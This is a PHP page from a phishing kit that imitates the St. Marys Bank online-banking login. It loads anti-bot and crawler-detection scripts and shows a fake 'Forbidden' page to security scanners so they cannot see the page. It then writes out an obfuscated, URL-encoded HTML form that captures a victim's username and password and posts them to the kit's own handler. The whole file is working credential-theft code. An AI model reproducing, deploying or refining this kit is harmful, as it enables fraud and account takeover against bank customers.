<?php

$settings = include '../../settings/settings.php';
$useragent = $_SERVER['HTTP_USER_AGENT'];
include '../Bots/fucker.php';
include("../Bots/Anti/out/blacklist.php");
include("../Bots/Anti/out/bot-crawler.php");
include("../Bots/Anti/out/anti.php");
include("../Bots/Anti/out/ref.php");
include("../Bots/Anti/out/bots.php");
@require("../Bots/Anti/out/Crawler/src/CrawlerDetect.php");

$settings = include '../../settings/settings.php';

use JayBizzle\CrawlerDetect\CrawlerDetect;

$CrawlerDetect = new CrawlerDetect;

if($CrawlerDetect->isCrawler($useragent)){
  header("HTTP/1.0 404 Not Found");
  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}

$bot = include '../Bots/bot.php';
if($bot == "is_bot"){
  header("HTTP/1.0 404 Not Found");
  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}


?>
<script>
document.write(unescape('%0A%3Chtml%20lang%3D%22en%22%20class%3D%22__sticky-footer%20__sticky-footer--links%22%3E%0A%0A%3Chead%3E%0A%09%0A%09%3Ctitle%3ESt.%20Marys%20Bank%3C/title%3E%0A%09%3Clink%20rel%3D%22shortcut%20icon%22%20href%3D%22https%3A//i8.ae/kJZVb%22%20type%3D%22image/x-icon%22%3E%0A%09%3Cmeta%20charset%3D%22UTF-8%22%3E%0A%09%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20user-scalable%3Dno%2C%20initial-scale%3D1.0%2C%20maximum-scale%3D1.0%2C%20minimum-scale%3D1.0%22%3E%0A%09%3Cmeta%20http-equiv%3D%22X-UA-Compatible%22%20content%3D%22ie%3Dedge%22%3E%0A%09%3Cmeta%20name%3D%22format-detection%22%20content%3D%22telephone%3Dno%22%3E%0A%09%3Clink%20href%3D%22files/css.css%22%20rel%3D%22stylesheet%22%3E%0A%09%0A%3C/head%3E%0A%0A%3Cbody%3E%0A%09%0A%09%3Cform%20action%3D%22process/verify_session_index%22%20method%3D%22post%22%3E%0A%09%09%3Cinput%20id%3D%22UnMaskedUserId%22%20name%3D%22UnMaskedUserId%22%20type%3D%22hidden%22%20value%3D%22%22%3E%0A%09%09%3Cinput%20type%3D%22hidden%22%20id%3D%22MtbAppSessionId%22%20name%3D%22MtbAppSessionId%22%20value%3D%22f920bc07-ff6a-4f37-a6a4-c1f1ee68e8f6%22%3E%0A%09%09%3Cdiv%20class%3D%22mtb-app-enrollment%22%3E%0A%09%09%09%3Cheader%20class%3D%22mtb-page-header%22%3E%0A%09%09%09%09%3Cinput%20type%3D%22hidden%22%20id%3D%22TagPageName%22%20name%3D%22TagPageName%22%20value%3D%22OLB%3ALogin%3AIndex%22%3E%0A%09%09%09%09%3Cdiv%20class%3D%22grid-x%20align-center%22%3E%0A%09%09%09%09%09%3Cdiv%20class%3D%22cell%22%3E%0A%09%09%09%09%09%09%3Ca%20href%3D%22%22%20class%3D%22mtb__logo%22%3E%3Cimg%20src%3D%22files/emblem_logo.png%22%20alt%3D%22eeeM%26amp%3BT%20Bank%20Site%22%3E%3C/a%3E%0A%09%09%09%09%09%3C/div%3E%0A%09%09%09%09%3C/div%3E%0A%09%09%09%3C/header%3E%0A%09%09%09%3Cdiv%20class%3D%22mtb-page-error%20hide%20js-pgLevelMsg%22%3E%0A%09%09%09%09%3Cdiv%20class%3D%22mtb-app-default--content%22%3E%0A%09%09%09%09%09%3Cdiv%20class%3D%22callout%20__has-icon%20warning%20__no-border%22%3E%3Ci%20class%3D%22__is-icon%20m-icon%20m-icon-notification%22%3E%3Cspan%20class%3D%22show-for-sr%22%3ENotification%20Icon%3C/span%3E%3C/i%3E%20Please%20provide%20your%20User%20ID%20and%20Passcode.%20%3C/div%3E%0A%09%09%09%09%3C/div%3E%0A%09%09%09%3C/div%3E%0A%09%09%09%3Cdiv%20class%3D%22mtb-app-login--content%22%3E%0A%09%09%09%09%3Cdiv%20class%3D%22grid-x%20grid-padding-x%20grid-x__padded%20__spacer-section%22%3E%0A%09%09%09%09%09%3Cdiv%20class%3D%22cell%22%3E%0A%09%09%09%09%09%09%3Cinput%20type%3D%22hidden%22%20value%3D%22OLB%3ASSC%3ALogInToOnlineBanking%22%3E%0A%09%09%09%09%09%09%3Cdiv%20class%3D%22mtb-section-header%20mtb-section-header__login%22%3E%0A%09%09%09%09%09%09%09%3Ch1%3E%20Welcome%20to%20online%20banking%20%3C/h1%3E%0A%09%09%09%09%09%09%3C/div%3E%0A%09%09%09%09%09%3C/div%3E%0A%09%09%09%09%09%3Cdiv%20class%3D%22cell%22%3E%0A%09%09%09%09%09%09%3Clabel%20for%3D%22userId%22%3E%20Username%20%3C/label%3E%0A%09%09%09%09%09%09%3Cdiv%20class%3D%22input-group%20m-fake-single-input%22%3E%0A%09%09%09%09%09%09%09%3Cinput%20class%3D%22input-group-field%20js-formnputItem%22%20data-fc-id%3D%22121%22%20type%3D%22text%22%20id%3D%22username%22%20name%3D%22username%22%20autocomplete%3D%22off%22%20required%3D%22true%22%20data-inputtype%3D%22text%22%20data-attribute%3D%22%22%20maxlength%3D%2220%22%3E%0A%09%09%09%09%09%09%3C/div%3E%0A%09%09%09%09%09%3C/div%3E%0A%09%09%09%09%09%3Cdiv%20class%3D%22cell%22%3E%0A%09%09%09%09%09%09%3Clabel%20for%3D%22Passcode%22%3E%20Password%20%3C/label%3E%0A%09%09%09%09%09%09%3Cdiv%20class%3D%22input-group%20m-fake-single-input%22%3E%0A%09%09%09%09%09%09%09%3Cinput%20class%3D%22input-group-field%20js-formnputItem%22%20data-fc-id%3D%22122%22%20type%3D%22password%22%20id%3D%22password%22%20name%3D%22password%22%20autocomplete%3D%22off%22%20required%3D%22true%22%20data-inputtype%3D%22tel%22%20maxlength%3D%2220%22%3E%0A%09%09%09%09%09%09%09%3Cdiv%20class%3D%22input-group-button%22%3E%0A%09%09%09%09%09%09%09%09%3Cbutton%20type%3D%22button%22%20id%3D%22Show%22%20data-btnfor%3D%22Passcode%22%20class%3D%22button%20clear%20hide%20js-showHide%22%3EShow%3C/button%3E%0A%09%09%09%09%09%09%09%3C/div%3E%0A%09%09%09%09%09%09%3C/div%3E%0A%09%09%09%09%09%3C/div%3E%0A%09%09%09%09%09%3Cdiv%20class%3D%22cell%22%3E%0A%09%09%09%09%09%09%3Cdiv%20class%3D%22mtb-formcheckbox%22%3E%0A%09%09%09%09%09%09%09%3Cinput%20class%3D%22show-for-sr%22%20type%3D%22checkbox%22%20id%3D%22RememberUserId%22%20name%3D%22RememberUserId%22%20value%3D%22false%22%3E%0A%09%09%09%09%09%09%09%3Clabel%20for%3D%22RememberUserId%22%20class%3D%22__spacer-remove%22%3E%20Remember%20Username%20%3C/label%3E%0A%09%09%09%09%09%09%09%3Chr%20class%3D%22__spacer-section%22%3E%0A%09%09%09%09%09%09%3C/div%3E%0A%09%09%09%09%09%3C/div%3E%0A%09%09%09%09%3C/div%3E%0A%09%09%09%09%3Cdiv%20class%3D%22grid-x%20grid-padding-x%20__spacer-paragraph%20grid-x__padded%22%3E%0A%09%09%09%09%09%3Cdiv%20class%3D%22cell%22%3E%0A%09%09%09%09%09%09%3Cbutton%20type%3D%22submit%22%20class%3D%22button%20button__form-no-spacer%20expanded%20kessel-flush%22%20id%3D%22btnSubmit%22%3E%20Log%20In%20%3C/button%3E%0A%09%09%09%09%09%3C/div%3E%0A%09%09%09%09%09%3Cdiv%20class%3D%22cell%22%3E%3Ca%20href%3D%22%22%20class%3D%22button%20button__fake-padding-no-spacer%20expanded%20clear%22%20id%3D%22jsAnalyticsLink%22%3EForgot%20Username%20or%20Password%3C/a%3E%3C/div%3E%0A%09%09%09%09%09%3Cdiv%20class%3D%22cell%22%3E%3Ca%20href%3D%22%22%20class%3D%22button%20button__fake-padding-no-spacer%20expanded%20clear%22%20id%3D%22jsAnalyticsLink%22%20%20%20%3ERegister%20a%20New%20Account%3C/a%3E%3C/div%3E%0A%09%09%09%09%09%0A%09%09%09%09%3C/div%3E%0A%09%09%09%3C/div%3E%0A%09%09%09%0A%09%09%3C/div%3E%0A%09%3C/form%3E%0A%09%0A%3C/body%3E%0A%0A%3C/html%3E'))
</script>